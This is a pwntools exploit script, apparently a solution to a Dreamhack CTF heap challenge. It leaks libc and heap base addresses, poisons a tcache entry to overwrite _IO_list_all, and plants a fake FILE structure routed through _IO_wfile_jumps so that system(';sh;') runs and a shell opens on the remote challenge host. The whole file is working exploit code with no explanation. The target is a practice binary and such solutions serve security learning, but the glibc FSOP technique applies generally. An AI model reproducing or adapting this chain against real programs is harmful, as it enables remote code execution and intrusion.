#!/usr/bin/python3 
from pwn import *

exe = ELF('./prob_patched',checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

leak = lambda i, offset = 0: u64(i.ljust(8, b'\0')) - offset
leak_hex = lambda i, offset = 0: int(i, 16) - offset
leak_dec = lambda i, offset = 0: int(i, 10) - offset
info = lambda msg, addr: log.info(msg + hex(addr))

def GDB():
	gdb.attach(p, gdbscript='''
		b* _IO_wfile_overflow
		b* _IO_wdoallocbuf
		c
		''')

HOST = 'host8.dreamhack.games'
PORT = 12492

if args.REMOTE:
	p = remote(HOST, PORT)
else:
	p = process(exe.path)

def allocation(idx, type, val, length, data):
	sla(b'>> ', b'1')
	slan(b'Index: ', idx)
	slan(b'Type: ', type)
	if (type != 4):
		slan(b'Value: ', val)
	else:
		slan(b'Length: ', length)
		sla(b'Data: ', data)
def free(idx):
	sla(b'>> ', b'2')
	slan(b'Index: ', idx)
def read(idx):
	sla(b'>> ', b'3')
	slan(b'Index: ', idx)
def write(idx, val):
	sla(b'>> ', b'4')
	slan(b'Index: ', idx)
	slan(b'Value: ', val)
def write_length(idx, length, data):
	sla(b'>> ', b'4')
	slan(b'Index: ', idx)
	slan(b'Length: ', length)
	sa(b'Data: ', data)

#GDB()
input("Stage 1: Leak Libc & heap")
allocation(0, 4, 0, 0x500, b'\x00')
allocation(1, 4, 0, 0x20, b'\x00')
allocation(2, 4, 0, 0x20, b'\x00')
free(0)
allocation(0, 4, 0, 0x500, b'')
read(0)
ru(b'Value: ')
libc.address = leak(r(8), 0x203b0a)
info("Libc Base: ", libc.address)
free(1)
free(2)
allocation(1, 4, 0, 0x20, b'')
read(1)
ru(b'Value: ')
tmp1 = u64(p.recv(8))
allocation(2, 4, 0, 0x20, b'')
read(2)
ru(b'Value: ')
tmp2 = leak(r(8))
heap_base = (tmp1 ^ tmp2) - 0x700
info("Heap Base: ", heap_base)
input("Stage 2: Fake _IO_list_all | FSOP")
target = ((heap_base + 0x830) >> 12) ^ (libc.sym._IO_list_all)
allocation(0, 4, 0, 0x10, b'\x00')
allocation(1, 4, 0, 0x10, b'\x00')
allocation(2, 4, 0, 0x10, b'\x00')
free(2)
free(1)
allocation(0, 3, 0x500, 0, b'\x00')
sla(b'>> ', b'1')
sla(b'Index: ', b'0')
sla(b'Type: ', b'5')
pld = b'\x00' * 0x18 + p64(0x21) + p64(target)
write_length(0, 1, pld)
allocation(3, 4, 0, 0x10, b'\x00')
allocation(4, 4, 0, 0x10, p64(heap_base + 0x870))
pld = b'\x01\x01;sh;\x00\x00'
pld = pld.ljust(0x28, b'\x00') + p64(1)
pld = pld.ljust(0x88, b'\x00') + p64(libc.sym._IO_2_1_stdout_ - 0x50)
pld = pld.ljust(0xa0, b'\x00') + p64(heap_base + 0x950 - 0x8)
pld = pld.ljust(0xd8, b'\x00') + p64(libc.sym._IO_wfile_jumps)
pld = pld.ljust(0xd8 + 0xe0, b'\x00') + p64(heap_base + 0xa30 - 0x68)
pld += p64(libc.sym.system)
allocation(5, 4, 0, 0x500, pld)
sla(b'>> ', b'5')
p.interactive()
# OOB